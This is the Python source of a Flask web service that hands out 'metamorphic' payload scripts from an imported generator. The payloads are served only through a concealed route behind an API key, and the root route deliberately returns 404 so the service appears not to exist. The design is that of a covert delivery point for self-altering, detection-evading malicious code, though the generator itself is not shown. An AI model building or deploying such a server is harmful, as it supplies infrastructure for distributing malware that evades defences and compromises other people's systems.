from flask import Flask, request, jsonify, abort
import subprocess
import os
import logging
from payload_generator import generate_metamorphic_payload
from config import API_KEY, OBFUSCATED_PATH, MAX_PAYLOAD_SIZE, REQUEST_TIMEOUT, MAX_REQUESTS_PER_MINUTE, LOG_LEVEL, LOG_FILE
import time
from collections import deque
import threading

# Configure logging
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    filename=LOG_FILE
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Rate limiting
request_times = deque(maxlen=MAX_REQUESTS_PER_MINUTE)
rate_limit_lock = threading.Lock()

def check_rate_limit():
    with rate_limit_lock:
        now = time.time()
        # Remove requests older than 1 minute
        while request_times and now - request_times[0] > 60:
            request_times.popleft()
        if len(request_times) >= MAX_REQUESTS_PER_MINUTE:
            return False
        request_times.append(now)
        return True

# Completely remove index or default routes
@app.route('/', methods=['GET'])
def index():
    abort(404)  # Just show 404

# No generate path exposed
@app.route(OBFUSCATED_PATH, methods=['POST'])
def generate_payload():
    # Check API key
    api_key = request.headers.get('x-api-key')
    if not api_key:
        logger.warning("No API key provided in request")
        return jsonify({"error": "No API key provided"}), 401
    if api_key != API_KEY:
        logger.warning(f"Invalid API key provided: {api_key}")
        return jsonify({"error": "Invalid API key"}), 401
    
    # Check rate limit
    if not check_rate_limit():
        logger.warning("Rate limit exceeded")
        return jsonify({"error": "Rate limit exceeded"}), 429

    try:
        # Generate payload
        filename = generate_metamorphic_payload()
        
        # Read the generated payload
        with open(filename, 'r') as f:
            script_content = f.read()
        
        # Check payload size
        if len(script_content) > MAX_PAYLOAD_SIZE:
            logger.error(f"Generated payload exceeds size limit: {len(script_content)} bytes")
            return jsonify({"error": "Generated payload too large"}), 500

        logger.info(f"Successfully generated payload: {filename}")
        return jsonify({
            "status": "success",
            "filename": filename,
            "script": script_content
        })

    except Exception as e:
        logger.error(f"Error generating payload: {str(e)}")
        return jsonify({"error": str(e)}), 500

# Catch-all for everything else that should not exist
@app.errorhandler(404)
def not_found(e):
    return "404 Not Found", 404

@app.errorhandler(401)
def unauthorized(e):
    return jsonify({'status': 'error', 'message': str(e.description)}), 401

if __name__ == '__main__':
    logger.info("Starting API server...")
    app.run(host='0.0.0.0', port=8080, debug=False)
 